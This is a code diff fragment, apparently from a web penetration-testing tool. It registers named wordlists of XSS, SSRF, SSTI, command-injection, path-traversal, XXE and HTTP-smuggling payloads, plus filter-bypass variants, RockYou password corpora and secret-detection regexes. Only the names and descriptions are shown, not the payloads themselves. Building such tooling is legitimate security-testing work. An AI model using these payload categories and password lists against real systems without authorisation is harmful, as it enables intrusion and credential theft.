+    { "xss/attribute_context", "XSS Attribute Context", "Attribute-breakout XSS payloads.", kXssAttributeContext },
+    { "xss/script_context", "XSS Script Context", "JavaScript string and script-context XSS payloads.", kXssScriptContext },
+    { "xss/url_context", "XSS URL Context", "URL, href, redirect, and data-URI XSS payloads.", kXssUrlContext },
+    { "xss/polyglot_expanded", "XSS Polyglot Expanded", "Expanded cross-context XSS polyglots.", kXssPolyglotExpanded },
+    { "xss/csp_bypass", "XSS CSP Bypass", "Payloads that exercise CSP bypass candidates without changing browser policy.", kXssCspBypass },
+    { "xss/waf_bypass", "XSS WAF Bypass", "Encoded and syntax-mutated XSS payloads for filter bypass testing.", kXssWafBypass },
+    { "auth/usernames_common_expanded", "Auth Usernames Expanded", "Expanded common username corpus for bounded auth testing.", kAuthUsernamesCommonExpanded },
+    { "auth/passwords_common_expanded", "Auth Passwords Expanded", "Expanded common password corpus for bounded auth testing.", kAuthPasswordsCommonExpanded },
+    { "auth/passwords_rockyou", "RockYou Passwords Curated", "Curated high-frequency RockYou-compatible password corpus for bounded credential tests.", kAuthPasswordsRockyou },
+    { "ssrf/internal_urls", "SSRF Internal URLs", "Internal, loopback, private-network, and scheme-bypass SSRF targets.", kSsrfInternalUrls },
+    { "ssrf/cloud_metadata_expanded", "SSRF Cloud Metadata Expanded", "Expanded cloud metadata URLs across AWS, Azure, GCP, Alibaba, Oracle, DigitalOcean, and OpenStack.", kSsrfCloudMetadataExpanded },
+    { "ssti/jinja2", "SSTI Jinja2", "Jinja2 and Flask template injection probes.", kSstiJinja2 },
+    { "ssti/twig", "SSTI Twig", "Twig template injection probes.", kSstiTwig },
+    { "ssti/freemarker", "SSTI Freemarker", "Freemarker template injection probes.", kSstiFreemarker },
+    { "ssti/velocity", "SSTI Velocity", "Apache Velocity template injection probes.", kSstiVelocity },
+    { "ssti/smarty", "SSTI Smarty", "Smarty template injection probes.", kSstiSmarty },
+    { "ssti/detect", "SSTI Detection", "Cross-engine arithmetic and syntax probes for SSTI detection.", kSstiDetect },
+    { "cmdi/unix_advanced", "Command Injection Unix Advanced", "Unix command-injection payloads with separators, substitutions, time probes, and bypass forms.", kCmdiUnixAdvanced },
+    { "cmdi/windows_advanced", "Command Injection Windows Advanced", "Windows command-injection payloads for cmd and PowerShell contexts.", kCmdiWindowsAdvanced },
+    { "cmdi/filter_bypass", "Command Injection Filter Bypass", "Encoded and metacharacter-mutated command injection payloads.", kCmdiFilterBypass },
+    { "path_traversal/unix_advanced", "Path Traversal Unix Advanced", "Unix file-read and wrapper traversal payloads.", kPathTraversalUnixAdvanced },
+    { "path_traversal/windows_advanced", "Path Traversal Windows Advanced", "Windows file-read traversal payloads.", kPathTraversalWindowsAdvanced },
+    { "path_traversal/encoding_bypass", "Path Traversal Encoding Bypass", "Encoded, double-encoded, mixed-separator, and null-byte traversal payloads.", kPathTraversalEncodingBypass },
+    { "xxe/oob", "XXE OOB", "Out-of-band XML external entity payload templates using the AIDA_OOB marker.", kXxeOob },
+    { "xxe/error_based", "XXE Error-Based", "In-band file-read and parser-error XXE payloads.", kXxeErrorBased },
+    { "xxe/ssrf", "XXE SSRF", "XXE payloads that target metadata and internal HTTP endpoints.", kXxeSsrf },
+    { "smuggling/cl_te", "HTTP Smuggling CL.TE", "Conflicting Content-Length and Transfer-Encoding request templates.", kSmugglingClTe },
+    { "smuggling/te_cl", "HTTP Smuggling TE.CL", "Transfer-Encoding then Content-Length smuggling request templates.", kSmugglingTeCl },
+    { "smuggling/te_te", "HTTP Smuggling TE.TE", "Ambiguous duplicated Transfer-Encoding request templates.", kSmugglingTeTe },
+    { "fuzz/common_params", "Fuzz Common Parameters", "Common query, body, auth, pagination, and feature-flag parameter names.", kFuzzCommonParams },
+    { "params/common", "Parameters Common", "Compatibility alias for common web parameter mining names.", kFuzzCommonParams },
+    { "fuzz/common_headers", "Fuzz Common Headers", "Common request headers used for active API and proxy differential testing.", kFuzzCommonHeaders },
+    { "fuzz/content_types", "Fuzz Content Types", "Common API and web content types for parser behavior testing.", kFuzzContentTypes },
+    { "fuzz/dir_small", "Fuzz Directories Small", "Small high-signal directory discovery corpus.", kDirsCommon100 },
+    { "fuzz/dir_medium", "Fuzz Directories Medium", "Medium high-value content discovery corpus.", kDirsQuickhits },
+    { "fuzz/dir_big", "Fuzz Directories Big", "Large web content discovery corpus.", kDirsBig },
+    { "graphql/fields", "GraphQL Fields", "Common GraphQL field names for schema review and resolver probing.", kGraphqlFields },
+    { "graphql/operations", "GraphQL Operations", "Bounded GraphQL operation templates for offensive API checks.", kGraphqlOperations },
+    { "idor/id_patterns", "IDOR Identifier Patterns", "Common numeric, UUID, keyword, and traversal-adjacent object identifiers.", kIdorIdPatterns },
+    { "js/secrets_patterns", "JavaScript Secret Regex Patterns", "Regex corpus for redacted JavaScript secret detection.", kJsSecretsPatterns },
 };
 
 }
